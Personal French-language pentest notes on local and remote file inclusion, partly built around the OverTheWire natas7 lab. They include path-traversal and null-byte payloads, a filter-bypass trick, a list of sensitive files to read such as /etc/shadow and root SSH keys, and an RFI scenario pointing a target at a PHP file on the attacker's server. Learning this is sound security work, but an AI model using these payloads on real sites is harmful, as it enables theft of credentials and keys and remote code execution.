DEUX TYPES DE FILE INCLUDE :  
[https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion "https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion")  
Local File Include (LFI) :

Chercher des fichiers local (de l'hôte donc du site target). Attention c'est que par tâtonnement parce que tu dois connaitre le nom du fichier que tu cherche.

Comment savoir si un site est vulnérable de LFI ?

Souvent un truc du genre [http://natas7.natas.labs.overthewire.org/index.php?page=home](http://natas7.natas.labs.overthewire.org/index.php?page=home "http://natas7.natas.labs.overthewire.org/index.php?page=home") où index.php est le fichier qui englobe la page home (va chercher sur internet pour comprendre ca stv). c'est à partir de ce fichier qu'on peut remonter dans les dossiers. Home c'est juste la page qui est contenue dans le fichier index.php mais c'est pas la seule. on s'en fout un peu de home.

A la place de home on peut mettre /etc/passwd pour tester : [http://natas7.natas.labs.overthewire.org/index.php?page=](http://natas7.natas.labs.overthewire.org/index.php?page=home "http://natas7.natas.labs.overthewire.org/index.php?page=home")/etc/passwd.

Pour remonter dans un dossier parent on ajoute ../ avant là où on veut aller.

Exemple : [http://natas7.natas.labs.overthewire.org/index.php?page=](http://natas7.natas.labs.overthewire.org/index.php?page=home "http://natas7.natas.labs.overthewire.org/index.php?page=home")../../../../etc/fichierprout.txt

Commande PHP vulnérable :  
file_get_content

Fichier qu'on voudrais voir :

/etc/issue — contains a message or system identification to be printed before the login prompt.

/etc/profile  — controls system-wide default variables, such as Export variables,  File creation mask (umask), Terminal types, Mail messages to indicate  when new mail has arrived

/proc/version — specifies the version of the Linux kernel  
/etc/passwd — has all registered user that has access to a system  
/etc/shadow — contains information about the system’s users’ passwords  
/root/.bash_history — contains the history commands for root user

/var/log/dmessage — contains global system messages, including the messages that are logged during system startup

/var/mail/root — all emails for root user

/root/.ssh/id_rsa — Private SSH keys for a root or any known valid user on the server

/var/log/apache2/access.log — the accessed requests for Apache webserver  
C:\boot.ini — contains the boot options for computers with BIOS firmware

NULL byte :

En php, le null byte (%00) sert à indiquer la fin d'une chaine de caractère. Y'a plusieurs (anciennes) vulnérabilité possibles grace à %00.

Imaginons que dans l'url, le site nous demande quelle page aller. Sauf que dans le code, le site rajoute .php à la fin donc toute les pages qu'on passe sont forcément en php. exemple : [http://11.11.11.11/home/file?id=page1](http://11.11.11.11/home/file?id=page1 "http://11.11.11.11/home/file?id=page1"). Bah ca cherchera automatiquement une page php car c'est ajouté après.

Maintenant imaginons qu'on mette %00 après page1. (page1%00) cela enlèvera la spécification de php car on indique une fin de chaine de caractère. Donc ca cherchera n'importe quelle type de fichier. On peut donc tenter une local file inclusion en indiquant le null byte a la fin. exemple [http://11.11.11.11/home/file?id=/../../../../etc/passwd](http://11.11.11.11/home/file?id=/../../../../etc/passwd%00 "http://11.11.11.11/home/file?id=/../../../../etc/passwd%00")

Nouveau scénario :

le dev remplace les ../ par du vide. On peut tenter de mettre ....// car ca va enlever le ../ du milieu mais garder les coté.

Nouveau scénario :

le dev nous oblige à inclure un chemin spécifié. Alors on peut faire ?lang=languages/../../../../../etc/passwd (garder le languages/ pour pas que la remonté de repo se fasse voir.

Remote File Include (RFI) :

- La RFI est une vulnérabilité de sécurité où un attaquant peut forcer un serveur à inclure des fichiers distants sur le site cible.
- Cette vulnérabilité peut conduire à l'exécution de commandes à distance (RCE) si le fichier inclus est un fichier PHP malveillant.
- L'attaquant utilise généralement des paramètres d'URL ou des données fournies par l'utilisateur pour influencer le chemin du fichier inclus.

**Identification de la Vulnérabilité RFI :**

- Si vous soupçonnez qu'un site peut être vulnérable à la RFI, recherchez des endroits où l'application inclut des fichiers externes, tels que `include()`, `require()`, etc.
- Vérifiez si l'application utilise des paramètres d'URL ou des données fournies par l'utilisateur pour construire les chemins des fichiers inclus.

Scénario :

J'ai un server (python -m http.server 8000) avec un fichier cmd.php qui contient . Maintenant si on a un site cible qui a allow_url_fopen sur ON, avec un url http://server_target.com/index.php?lang=. On peut faire  http://server_target.com/index.php?lang=http://mon_addr_ip/cmd.php pour redirigé le site cible vers mon fichier .php. Le code php va donc être exécuté sur le site donc il y aura test écrit.